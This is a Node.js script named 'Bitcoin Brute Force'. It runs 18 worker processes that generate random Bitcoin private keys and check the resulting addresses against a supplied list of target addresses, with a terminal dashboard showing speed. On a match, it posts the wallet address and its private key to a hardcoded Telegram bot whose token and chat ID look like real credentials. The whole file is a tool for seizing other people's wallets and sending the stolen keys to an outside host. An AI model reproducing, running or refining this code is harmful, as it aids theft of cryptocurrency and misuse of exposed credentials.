"use strict";

process.title = "Bitcoin Brute Force by Xuě Láng";

// Importing required modules
const CoinKey = require('coinkey');
const crypto = require('crypto');
const cluster = require('cluster');
let numCPUs = require('os').cpus().length;
const blessed = require('blessed');
const axios = require('axios');

// Telegram Bot configuration
const TELEGRAM_BOT_TOKEN = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '-4562112556'; // Replace with your chat ID


// Initializing a Set to store addresses
let addresses = new Set();
numCPUs = 18;
// Reading data from a file named 'data.txt'
const fs = require('fs');
const data = fs.readFileSync('./data_address.txt');
// Splitting the data by new line and adding each address to the Set
data.toString().split("\n").forEach(address => {
    if (address.startsWith('1')) {
        addresses.add(address);
    } else {
        console.error('Error: Addresses are not in correct format. Legacy Bitcoin Addresses must start with 1');
        process.exit(1);
    }
});

// Initializing an object to store counts for each worker
let counts = {};
let startTime = Date.now();

// Function to generate a private key and check if the corresponding public address is in the Set of addresses
async function generate() {
    // Incrementing the count for the current worker
    counts[cluster.worker.id] = (counts[cluster.worker.id] || 0) + 1;
    // Sending the updated counts to the master process
    process.send({counts: counts});

    // Generating a random private key in hexadecimal format
    let privateKeyHex = crypto.randomBytes(32).toString('hex');

    // Creating a CoinKey object using the private key
    let ck = new CoinKey(Buffer.from(privateKeyHex, 'hex'));

    // Setting the compressed property of the CoinKey object to false
    ck.compressed = false;

    // Checking if the public address corresponding to the private key is in the Set of addresses
    if (addresses.has(ck.publicAddress)) {
        console.log("");
        // Making a beep sound
        process.stdout.write('\x07');
        // Logging success message with the public address in green color
        console.log("\x1b[32m%s\x1b[0m", ">> Match Found: " + ck.publicAddress);

        let successString = `Wallet: ${ck.publicAddress}\n\nSeed: ${ck.privateWif}\n\nDon't forget to donate : Bitcoin: --`;

        // Send success message to Telegram
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: successString
            });
            console.log('Telegram message sent successfully.');
        } catch (error) {
            console.error('Error sending Telegram message:', error);
        }

        // Exiting the process
        process.exit();
    }
}

// Checking if the current process is the master process
if (cluster.isMaster) {
    let screen = blessed.screen({
        smartCSR: true,
        top: '0%',
        left: '0%',
        width: '100%',
        height: '100%'
    });

    let boxes = [];
    let columns = 2; // Number of columns for the layout

    // Calculate the number of rows in each column
    let numRows = Math.ceil(numCPUs / columns);
    let rows = Math.ceil(numCPUs / 2);

    for (let i = 0; i < numCPUs; i++) {
        let column = Math.floor(i / numRows); // Column index (0 or 1)
        let row = i % numRows; // Row index within the column

        let boxHeight = `${100 / numRows}%`; // Each box height relative to the total height
        let boxWidth = '50%'; // Each box width, half of the total width for two columns

        let box = blessed.box({
            top: `${row * (100 / numRows)}%`,
            left: `${column * 50}%`,
            width: boxWidth,
            height: boxHeight,
            content: `Worker ${i + 1} Keys generated: 0 Speed: 0 keys/min`,
            border: {
                type: 'line'
            },
            style: {
                fg: 'green',
                border: {
                    fg: 'green'
                },
                font: `monospace ${Math.max(10 - numCPUs, 1)}` // Set font size
            }
        });

        screen.append(box);
        boxes.push(box);
    }

    cluster.on('message', (worker, message) => {
        if (message.counts) {
            for (let workerId in message.counts) {
                let elapsedTimeInMinutes = (Date.now() - startTime) / 60000;
                let speedPerMinute = message.counts[workerId] / elapsedTimeInMinutes;
                let index = workerId - 1;
                if (index >= 0 && index < boxes.length) {
                    boxes[index].setContent(`Worker ${workerId} Keys generated: ${message.counts[workerId]} Speed: ${speedPerMinute.toFixed(2)} keys/min`);
                }
            }
            screen.render();
        }
    });

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
    });
} else {
    setInterval(generate, 0);
}
